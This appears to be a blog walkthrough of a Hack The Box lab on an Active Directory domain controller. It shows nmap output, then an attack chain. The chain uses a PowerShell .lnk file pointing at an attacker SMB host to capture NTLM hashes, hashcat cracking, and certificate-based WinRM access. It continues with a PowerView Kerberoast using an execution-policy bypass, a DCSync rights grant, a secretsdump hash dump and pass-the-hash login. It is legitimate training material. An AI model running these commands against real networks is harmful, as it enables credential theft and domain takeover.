+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_ssl-date: 2026-06-30T16:29:13+00:00; -3s from scanner time.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:sizzle.HTB.LOCAL
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| Not valid before: 2021-02-11T12:59:51
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_Not valid after:  2022-02-11T12:59:51
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_http-title: Site doesn&#39;</span>t have a title <span style="color:#f92672">(</span>text/html<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>| http-methods: 
+</span></span><span style="display:flex;"><span>|_  Potentially risky methods: TRACE
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-IIS/10.0
+</span></span><span style="display:flex;"><span>| tls-alpn: 
+</span></span><span style="display:flex;"><span>|   h2
+</span></span><span style="display:flex;"><span>|_  http/1.1
+</span></span><span style="display:flex;"><span>|_ssl-date: 2026-06-30T16:29:13+00:00; -3s from scanner time.
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>sizzle.htb.local
+</span></span><span style="display:flex;"><span>| Not valid before: 2018-07-03T17:58:55
+</span></span><span style="display:flex;"><span>|_Not valid after:  2020-07-02T17:58:55
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds?
+</span></span><span style="display:flex;"><span>464/tcp   open  kpasswd5?
+</span></span><span style="display:flex;"><span>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>636/tcp   open  ssl/ldap
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>sizzle.HTB.LOCAL
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:sizzle.HTB.LOCAL
+</span></span><span style="display:flex;"><span>| Not valid before: 2021-02-11T12:59:51
+</span></span><span style="display:flex;"><span>|_Not valid after:  2022-02-11T12:59:51
+</span></span><span style="display:flex;"><span>|_ssl-date: 2026-06-30T16:29:13+00:00; -3s from scanner time.
+</span></span><span style="display:flex;"><span>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: HTB.LOCAL, Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_ssl-date: 2026-06-30T16:29:13+00:00; -3s from scanner time.
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>sizzle.HTB.LOCAL
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:sizzle.HTB.LOCAL
+</span></span><span style="display:flex;"><span>| Not valid before: 2021-02-11T12:59:51
+</span></span><span style="display:flex;"><span>|_Not valid after:  2022-02-11T12:59:51
+</span></span><span style="display:flex;"><span>3269/tcp  open  ssl/ldap
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>sizzle.HTB.LOCAL
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:sizzle.HTB.LOCAL
+</span></span><span style="display:flex;"><span>| Not valid before: 2021-02-11T12:59:51
+</span></span><span style="display:flex;"><span>|_Not valid after:  2022-02-11T12:59:51
+</span></span><span style="display:flex;"><span>|_ssl-date: 2026-06-30T16:29:13+00:00; -3s from scanner time.
+</span></span><span style="display:flex;"><span>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Not Found
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| tls-alpn: 
+</span></span><span style="display:flex;"><span>|   h2
+</span></span><span style="display:flex;"><span>|_  http/1.1
+</span></span><span style="display:flex;"><span>|_http-title: Not Found
+</span></span><span style="display:flex;"><span>|_ssl-date: 2026-06-30T16:29:14+00:00; -2s from scanner time.
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>sizzle.HTB.LOCAL
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:sizzle.HTB.LOCAL
+</span></span><span style="display:flex;"><span>| Not valid before: 2021-02-11T12:59:51
+</span></span><span style="display:flex;"><span>|_Not valid after:  2022-02-11T12:59:51
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>9389/tcp  open  mc-nmf        .NET Message Framing
+</span></span><span style="display:flex;"><span>47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Not Found
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>49664/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49665/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49666/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49669/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49671/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49687/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>49688/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49692/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49695/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49707/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49711/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
+</span></span><span style="display:flex;"><span>Device type: general purpose
+</span></span><span style="display:flex;"><span>Running <span style="color:#f92672">(</span>JUST GUESSING<span style="color:#f92672">)</span>: Microsoft Windows 2012|2016|2008|<span style="color:#ae81ff">7</span> <span style="color:#f92672">(</span>91%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>OS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7
+</span></span><span style="display:flex;"><span>Aggressive OS guesses: Microsoft Windows Server <span style="color:#ae81ff">2012</span> R2 <span style="color:#f92672">(</span>91%<span style="color:#f92672">)</span>, Microsoft Windows Server <span style="color:#ae81ff">2016</span> <span style="color:#f92672">(</span>91%<span style="color:#f92672">)</span>, Microsoft Windows <span style="color:#ae81ff">7</span> or Windows Server <span style="color:#ae81ff">2008</span> R2 <span style="color:#f92672">(</span>85%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>test conditions non-ideal<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Network Distance: <span style="color:#ae81ff">2</span> hops
+</span></span><span style="display:flex;"><span>Service Info: Host: SIZZLE; OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>| smb2-security-mode: 
+</span></span><span style="display:flex;"><span>|   3:1:1: 
+</span></span><span style="display:flex;"><span>|_    Message signing enabled and required
+</span></span><span style="display:flex;"><span>| smb2-time: 
+</span></span><span style="display:flex;"><span>|   date: 2026-06-30T16:28:36
+</span></span><span style="display:flex;"><span>|_  start_date: 2026-06-30T16:21:40
+</span></span><span style="display:flex;"><span>|_clock-skew: mean: -2s, deviation: 0s, median: -3s
+</span></span></code></pre></div><p>Looking at the results, I know that this is a Windows environment and we’re running against a Domain Controller. I immediately notice FTP, HTTP and HTTPS as a good point to start scanning while examining SSH.</p>
+<h2 id="initial-steps"><a href="#initial-steps" class="header-anchor"></a>Initial Steps
+</h2><p>I started by logging into FTP anonymously. That ended up being a dead end as I didn’t have permission to view anything. I targeted HTTP and HTTPS next. Both loaded a GIF of bacon sizzling. I examined the source code to look for any hints or misconfigurations and came up empty-handed. I started directory busting for both services and came up empty handed again.</p>
+<h2 id="smb"><a href="#smb" class="header-anchor"></a>SMB
+</h2><p>While the directory busting was running, I started investigating SMB. I was able to view it anonymously and see the shares using smbclient.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbclient -L <span style="color:#ae81ff">\\\\</span><span style="color:#f92672">[</span>IP<span style="color:#f92672">]</span><span style="color:#ae81ff">\\</span> 
+</span></span></code></pre></div><p>A few things immediately stood out: CertEnroll, Department Shares and Operations. The CertEnroll indicates that the machine is acting as a Certificate Authority and is responsible for providing certificates to the organization. Upon initial discovery, I completely skimmed over this folder. Hindsight being 20/20, I should have investigated this folder more. Department Shares is a juicy folder as it could contain data that can be used for privilege escalation. Operations could be any number of things.</p>
+<p>I attempted to connect to CertEnroll and was met with a denial. I moved on to Department Shares and saw there were quite a few folders. I copied all of them to my machine to investigate, hoping that there was something in there.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mrecurse on 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>mprompt off 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>mget * 
+</span></span></code></pre></div><p>Once I had them on my machine, I ran a command to see if any of the folders held any information.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ls -lah
+</span></span></code></pre></div><p>Lo and behold, most of the folders were decoys. Banking, HR, and Tax were all empty. The Users folder contained various user folders, including Public. More on this later. ZZ_Archive contains various files with different file types.</p>
+<p>I tried a few things, but nothing was successful. I happened to read the description, and it indicated that a share was writable and could lead to stolen NTLM hashes.</p>
+<h2 id="stealing-hashes"><a href="#stealing-hashes" class="header-anchor"></a>Stealing Hashes
+</h2><p>I investigated the ZZ_Archive folder and was able to read and write to that folder. I looked back at my notes from the Practical Ethical Hacker (PEH) course as I remember a watering hole attack that can be used. You place a file in the share, and when another user browses the folder, Windows attempts to retrieve the referenced resource. This causes Windows to create an SMB connection to my machine. In doing so, it must authenticate. This is where the attack becomes useful. When the server attempts to authenticate to my machine, Windows sends an NTLM challenge-response that I can capture for offline cracking.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$objShell <span style="color:#f92672">=</span> New-Object -ComObject WScript.shell 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$lnk <span style="color:#f92672">=</span> $objShell.CreateShortcut<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;C:\test.lnk&#34;</span><span style="color:#f92672">)</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$lnk.TargetPath <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;\\10.10.20.110\@test.png&#34;</span> <span style="color:#75715e">#points to the attacker machine </span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$lnk.WindowStyle <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$lnk.IconLocation <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;%windir%\system32\shell32.dll, 3&#34;</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$lnk.Description <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Test&#34;</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$lnk.HotKey <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Ctrl+Alt+T&#34;</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$lnk.Save<span style="color:#f92672">()</span> 
+</span></span></code></pre></div><p>Unfortunately, this didn’t work.</p>
+<p>I investigated the .rm and .ram file extensions, as I wasn’t familiar with those. Those files are used in RealMedia and can supposedly execute code. I attempted to have that reach out to an SMB share that I was hosting to grab hashes. That was unsuccessful as well.</p>
+<p>I then came across <a class="link" href="https://github.com/Greenwolf/ntlm_theft"  target="_blank" rel="noopener"
+    >ntlm_theft</a>. It is a python script that creates different files that will establish an SMB connection to the attacking machine. I created the files and placed them in the ZZ_Archive folder. That was unsuccessful as well. Looking through the folders again, I came across the Public user folder. I was able to place the ntlm_theft files in the Public folder and waited. Voila! I captured the hash for a user amanda.</p>
+<p><img alt="Captured Hash" loading="lazy" sizes="(max-width: 767px) calc(100vw - 30px), (max-width: 1023px) 700px, (max-width: 1279px) 950px, 1232px" src="amanda%20hash.png"></p>
+<p>I ran it through hashcat and was able to crack it.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hashcat -m <span style="color:#ae81ff">5600</span> hash /usr/share/wordlists/rockyou.txt 
+</span></span></code></pre></div><p><img alt="Cracked Password for Amanda" loading="lazy" sizes="(max-width: 767px) calc(100vw - 30px), (max-width: 1023px) 700px, (max-width: 1279px) 950px, 1232px" src="amanda%20hash%20cracked.png"></p>
+<p>I now have my foothold!</p>
+<h2 id="cert-time"><a href="#cert-time" class="header-anchor"></a>Cert Time
+</h2><p>I imported the collected data into BloodHound to better visualize relationships between users, groups, and privileges. I found out that Amanda was a member of the remote management users group. I attempted WinRM and failed to connect. I attempted a Kerberoast attack and was mildly successful. The attack didn’t complete as Kerberos wasn’t exposed to the “outside”. However, I was able to discover that the user mrlky was Kerberoastable. I saved this in my back pocket.</p>
+<p><img alt="Kerberoast Account" class="gallery-image" data-flex-basis="957px" data-flex-grow="399" height="422" loading="lazy" sizes="(max-width: 767px) calc(100vw - 30px), (max-width: 1023px) 700px, (max-width: 1279px) 950px, 1232px" src="/walkthroughs/sizzle/kerberoast_attempt.png" srcset="/walkthroughs/sizzle/kerberoast_attempt_hu_31785d5a65aec78c.png 800w, /walkthroughs/sizzle/kerberoast_attempt_hu_4d4a5c1c33ae295a.png 1600w, /walkthroughs/sizzle/kerberoast_attempt.png 1684w" width="1684"></p>
+<p>At this point, I spent a couple days (reminder that a “day” is 30 minutes) working through this box. I decided to look through and follow a walkthrough on an as-needed basis.</p>
+<p>Looking through one of the reviews, it mentioned to use the newly acquired account to get a user certificate. I verified that I could engage with the web enrollment. With Windows CA, you can go to [IP]\certsrv and request certificates. On my machine, I created a CSR that I used to get a certificate. To create a CSR, I ran</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>openssl req -nodes -newkey rsa:2048 -keyout amanda.key -out amanda.csr 
+</span></span></code></pre></div><p>This command creates a private key and CSR. I then logged into the web enrollment using Amanda’s credentials. I then requested a certificate.<br>
+<img alt="Requesting Cert" class="gallery-image" data-flex-basis="337px" data-flex-grow="140" height="574" loading="lazy" sizes="(max-width: 767px) calc(100vw - 30px), (max-width: 1023px) 700px, (max-width: 1279px) 950px, 1232px" src="/walkthroughs/sizzle/certsrv.png" srcset="/walkthroughs/sizzle/certsrv_hu_b609d1c01aa7e9df.png 800w, /walkthroughs/sizzle/certsrv.png 806w" width="806"></p>
+<p>Once you’re presented with the next screen, you’ll need to choose “advanced certificate request”.</p>
+<p>You’ll need to get the BASE64 of the CSR. To do so, run</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat <span style="color:#f92672">[</span>name<span style="color:#f92672">]</span>.csr
+</span></span></code></pre></div><p>Copy the output and put it in the BASE64 field. Select the usercert template and submit.</p>
+<p><img alt="Submission of CSR" loading="lazy" sizes="(max-width: 767px) calc(100vw - 30px), (max-width: 1023px) 700px, (max-width: 1279px) 950px, 1232px" src="csr%20paste.png"></p>
+<p>Once the certificate has been created, download the BASE64 version of the certificate. You’ll be presented with a certificate named certnew.cer.</p>
+<p>Because Amanda was permitted to enroll for a User certificate, I could authenticate to WinRM using certificate-based authentication instead of a password.</p>
+<h2 id="back-to-winrm"><a href="#back-to-winrm" class="header-anchor"></a>Back to WinRM
+</h2><p>I have the cert, awesome! Now what? I learned that there is a Ruby script that allows for WinRM connectivity via certificates. I found the script here and modified it to fit my environment. Make sure that you keep the script in the same folder the key and certificate are in. To run the script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rlwrap ruby WinRM_shell.rb 
+</span></span></code></pre></div><p>Lo and behold, it works! I now have access to the machine via WinRM. I attempted to grab the user flag, but it was nowhere to be had.</p>
+<p><img alt="Initial WinRM" loading="lazy" sizes="(max-width: 767px) calc(100vw - 30px), (max-width: 1023px) 700px, (max-width: 1279px) 950px, 1232px" src="initial%20foothold.png"></p>
+<h2 id="its-kerberoasting-time"><a href="#its-kerberoasting-time" class="header-anchor"></a>It&rsquo;s Kerberoasting Time
+</h2><p>Again, continuing along the walkthrough, it was time to start Kerberoasting. Kerberoasting targets accounts associated with Service Principal Names (SPNs). When a domain user requests a service ticket (TGS) for one of these services, the ticket is encrypted using the service account’s password hash. This allows an attacker to request the ticket and then attempt to crack it offline. Normally, you can perform a Kerberoast from the attacking machine. However, with this box Kerberos (port 88) wasn’t available to machines outside of the box.</p>
+<p>To perform a Kerberoast on this machine, you have to do it “internal” to the machine. Knowing that I had enumerated an account earlier, I focused on how to perform the attack on the machine itself. After some research and reviewing a walkthrough for guidance, I was able to continue progressing through the attack path.</p>
+<p>I transferred PowerView from my machine to the remote machine. PowerView has a Kerberoast function built into it. I had to make a small modification to PowerView so it would successfully request the ticket under this environment. Once the script was modified, I ran the following command:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>powershell -v <span style="color:#ae81ff">2</span> -ep bypass -c <span style="color:#e6db74">&#34;. C:\temp\powerview.ps1; `</span>$SecPassword<span style="color:#e6db74"> = ConvertTo-SecureString &#39;[AMANDA_PASS] -AsPlainText -Force; `</span>$Cred<span style="color:#e6db74"> = New-Object System.Management.Automation.PSCredential(&#39;HTB.LOCAL\amanda&#39;, `</span>$SecPassword<span style="color:#e6db74">); Get-DomainSPNTicket -SPN &#39;http/sizzle&#39; -Credential `</span>$Cred<span style="color:#e6db74"> -OutputFormat hashcat | Out-File C:\temp\roast.txt&#34;</span> 
+</span></span></code></pre></div><p>The WinRM session was running under a constrained PowerShell environment that prevented PowerView from functioning correctly. By launching PowerShell version 2, I was able to execute PowerView without the restrictions imposed by the newer PowerShell environment and successfully request the service ticket.</p>
+<p>The Kerberoast was successful and I had a hash for mrlky. I ran that through hashcat and was able to crack it.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hashcat -m <span style="color:#ae81ff">13100</span> kerb.txt /usr/share/wordlists/rockyou.txt
+</span></span></code></pre></div><p><img alt="Successful Password Crack" class="gallery-image" data-flex-basis="583px" data-flex-grow="243" height="688" loading="lazy" sizes="(max-width: 767px) calc(100vw - 30px), (max-width: 1023px) 700px, (max-width: 1279px) 950px, 1232px" src="/walkthroughs/sizzle/hashcat.png" srcset="/walkthroughs/sizzle/hashcat_hu_65a034033c4a2d8e.png 800w, /walkthroughs/sizzle/hashcat_hu_8cc32c7d5089291d.png 1600w, /walkthroughs/sizzle/hashcat.png 1674w" width="1674"></p>
+<h2 id="pwned"><a href="#pwned" class="header-anchor"></a>Pwned
+</h2><p>Now that I have the mrlky hash, I can perform a DCSync and grab the domain administrator hash. A DCSync is a task that is performed by domain controllers to sync contents between them. By performing a DCSync attack, I can have the domain controller send the contents to my machine. This provides the user hashes of all domain users among other data.</p>
+<p>To perform the attack, I must grant permissions to the mrlky account to perform DCSyncs.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>impacket-dacledit -action write -rights DCSync -principal mrlky -target-dn <span style="color:#e6db74">&#39;DC=HTB,DC=LOCAL&#39;</span> -dc-ip <span style="color:#f92672">[</span>IP<span style="color:#f92672">]</span> <span style="color:#960050;background-color:#1e0010">&#39;</span>HTB.LOCAL/mrlky:<span style="color:#f92672">[</span>PASSWORD<span style="color:#f92672">]</span> 
+</span></span></code></pre></div><p>Now that the account has permissions, I can perform the DCSync.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>impacket-secretsdump htb/mrlky:<span style="color:#f92672">[</span>PASS<span style="color:#f92672">]</span>@<span style="color:#f92672">[</span>IP<span style="color:#f92672">]</span> 
+</span></span></code></pre></div><p>The attack completed successfully and I retrieved the domain Administrator hash.</p>
+<p><img alt="Domain Admin Hash" class="gallery-image" data-flex-basis="1440px" data-flex-grow="600" height="234" loading="lazy" sizes="(max-width: 767px) calc(100vw - 30px), (max-width: 1023px) 700px, (max-width: 1279px) 950px, 1232px" src="/walkthroughs/sizzle/DA_hash.png" srcset="/walkthroughs/sizzle/DA_hash_hu_d86105ecf2de9f56.png 800w, /walkthroughs/sizzle/DA_hash.png 1404w" width="1404"></p>
+<p>I start a WinRM session with the domain administrator hash and successfully pwn the domain.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Evil-winrm -I <span style="color:#f92672">[</span>DC_IP<span style="color:#f92672">]</span> -u administrator -H <span style="color:#f92672">[</span>hash<span style="color:#f92672">]</span> 
+</span></span></code></pre></div><p>I grab the user flag and root flag and finish the box.
+<img alt="Root Flag" loading="lazy" sizes="(max-width: 767px) calc(100vw - 30px), (max-width: 1023px) 700px, (max-width: 1279px) 950px, 1232px" src="root%20ctf.png"></p>
+<p><img alt="Sizzle Done" class="gallery-image" data-flex-basis="922px" data-flex-grow="384" height="115" loading="lazy" sizes="(max-width: 767px) calc(100vw - 30px), (max-width: 1023px) 700px, (max-width: 1279px) 950px, 1232px" src="/walkthroughs/sizzle/sizzle_complete.png" width="442"></p>
+<h2 id="final-thoughts"><a href="#final-thoughts" class="header-anchor"></a>Final Thoughts
+</h2><p>This box was extremely humbling. The box was labeled as “insane” in terms of difficulty. That already had me concerned. I try to use the walkthroughs as little as possible. Once I got to a point I couldn’t figure out, I’d look to the walkthrough as a hint and then research what I could do to get through to the next step. For reference, the walkthrough I used was <a class="link" href="https://pl4stic1337.github.io/writeups/htb-sizzle/"  target="_blank" rel="noopener"
+    >pL4StiC&rsquo;s walkthrough</a>. I know I don’t know everything, and I’m not even close to it, but I do know that I am learning little by little.</p>
+<p>Sizzle forced me to combine several techniques that I&rsquo;d previously practiced independently. Capturing NTLM hashes, abusing Active Directory Certificate Services, Kerberoasting, and finally performing a DCSync attack all had to be chained together correctly. Although I relied on hints throughout the process, I walked away with a much deeper understanding of how these attacks fit together in a real Active Directory environment.</p>
+<p>Thank you, the reader, for following along on this journey.</p>
+
+</section>
+
+
+    <footer class="article-meta article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/walkthrough/">Walkthrough</a>
+        
+            <a href="/tags/hack-the-box/">Hack the Box</a>
+        
+    </section>
+
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside>
+    <h2 class="section-title">Related content</h2>
+    <div class="subsection-list">
+        <div class="article-list--tile">
+            
+                
+<article class="">
+    <a href="/walkthroughs/blackfield/">
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HTB - Blackfield</h2>
+        </div>
+    </a>
+</article>
+            
+                
+<article class="">
+    <a href="/walkthroughs/monteverde/">
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HTB - Monteverde</h2>
+        </div>
+    </a>
+</article>
+            
+                
+<article class="">
+    <a href="/walkthroughs/sauna/">
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HTB - Sauna</h2>
+        </div>
+    </a>
+</article>
+            
+                
+<article class="">
+    <a href="/walkthroughs/forest/">
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HTB - Forest</h2>
+        </div>
+    </a>
+</article>
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2026 MidwestSec
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="4.0.3">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+
+
+
+<script type="module">
+    import gallery from '\/ts\/gallery.js';
+
+    const articleContent = document.querySelector('.article-content');
+    const shouldLoad = articleContent && (articleContent.querySelectorAll('figure').length > 0 || articleContent.querySelectorAll('img.gallery-image').length > 0);
+    
+    if (shouldLoad) {
+        gallery(articleContent);
+
+        const PhotoSwipeLightbox = (await import("https:\/\/cdn.jsdelivr.net\/npm\/photoswipe@5.4.4\/dist\/photoswipe-lightbox.esm.min.js")).default;
+        const styleHref = "https:\/\/cdn.jsdelivr.net\/npm\/photoswipe@5.4.4\/dist\/photoswipe.css";
+
+        const styleTag = document.createElement('link');
+        styleTag.rel = 'stylesheet';
+        styleTag.href = styleHref;
+        document.head.appendChild(styleTag);
+
+        const lightbox = new PhotoSwipeLightbox({
+            gallerySelector: '.article-content',
+            childSelector: 'figure a.image-link',
+            pswpModule: () => import("https:\/\/cdn.jsdelivr.net\/npm\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js")
+        });
+        lightbox.init();
+    }
+</script>
+
+    
+
+            </main>
+        </div>
+        
+<script type="text/javascript" src="/ts/main.f07e89f8b945a3818bfbdecdacc0e71d701338eaf57256cc61a181adf661b71c.js" defer></script>
+<script src="/pagefind/pagefind-ui.js"></script>
+
+<div id="mw-reading-progress"></div>
+
+<div id="mw-search-modal">
+    <div id="mw-search-box">
+        <button id="mw-search-close">Close</button>
+        <div id="search"></div>
+    </div>
+</div>
+
+<script>
+document.addEventListener("DOMContentLoaded", function () {
+    const menu = document.querySelector(".menu");
+
+    if (menu) {
+        const button = document.createElement("button");
+        button.id = "mw-search-button";
+        button.innerHTML = `
+            <span class="mw-search-left">
+                <svg class="mw-search-icon" viewBox="0 0 24 24" aria-hidden="true">
+                    <path d="M10.5 18a7.5 7.5 0 1 1 5.3-12.8A7.5 7.5 0 0 1 10.5 18Zm0-2a5.5 5.5 0 1 0 0-11 5.5 5.5 0 0 0 0 11Zm6.4.5 4.3 4.3-1.4 1.4-4.3-4.3 1.4-1.4Z"></path>
+                </svg>
+                <span>Search</span>
+            </span>
+            <span class="mw-search-shortcut">Ctrl+K</span>
+        `;
+        menu.prepend(button);
+    }
+
+    const modal = document.getElementById("mw-search-modal");
+
+    function initPagefind() {
+        if (window.PagefindUI && !document.querySelector(".pagefind-ui")) {
+            new PagefindUI({
+                element: "#search",
+                showSubResults: true,
